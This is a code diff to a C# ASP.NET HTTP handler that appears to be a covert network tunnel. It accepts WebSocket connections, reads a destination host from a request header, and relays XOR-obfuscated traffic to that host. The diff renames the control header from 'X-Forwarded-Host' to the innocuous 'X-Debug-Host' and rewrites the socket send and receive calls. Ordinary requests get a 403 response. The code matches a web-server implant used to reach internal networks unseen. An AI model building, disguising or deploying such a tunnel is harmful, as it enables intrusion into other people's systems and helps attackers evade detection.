@@ -19,6 +19,7 @@ public class Handler : IHttpHandler
     }
     public void ProcessRequest(HttpContext context)
     {
+
         var request = context.Request;
         var response = context.Response;
         if (!context.IsWebSocketRequest && !context.IsWebSocketRequestUpgrading)
@@ -26,7 +27,7 @@ public class Handler : IHttpHandler
             response.StatusCode = 403;
             return;
         }
-        var addr = request.Headers.Get("X-Forwarded-Host");
+        var addr = request.Headers.Get("X-Debug-Host");
         if (addr == null)
         {
             response.StatusCode = 403;
@@ -84,7 +85,9 @@ public class Handler : IHttpHandler
                             index = 0;
                         }
                     }
-                    await sock.SendAsync(new ArraySegment<byte>(buffer, 0, r.Count), SocketFlags.None).ConfigureAwait(false);
+                    await Task.Factory.FromAsync<int>(
+                        sock.BeginSend(buffer, 0, r.Count, SocketFlags.None, null, null),
+                        sock.EndSend).ConfigureAwait(false);
                 }
                 catch
                 {
@@ -103,7 +106,9 @@ public class Handler : IHttpHandler
             {
                 try
                 {
-                    var count = await sock.ReceiveAsync(new ArraySegment<byte>(buffer), SocketFlags.None).ConfigureAwait(false);
+                    var count = await Task.Factory.FromAsync<int>(
+                        sock.BeginReceive(buffer, 0, buffer.Length, SocketFlags.None, null, null),
+                        sock.EndReceive).ConfigureAwait(false);
                     for (int i = 0; i < count; i++)
                     {
                         buffer[i] = (byte)(buffer[i] ^ key[index]);
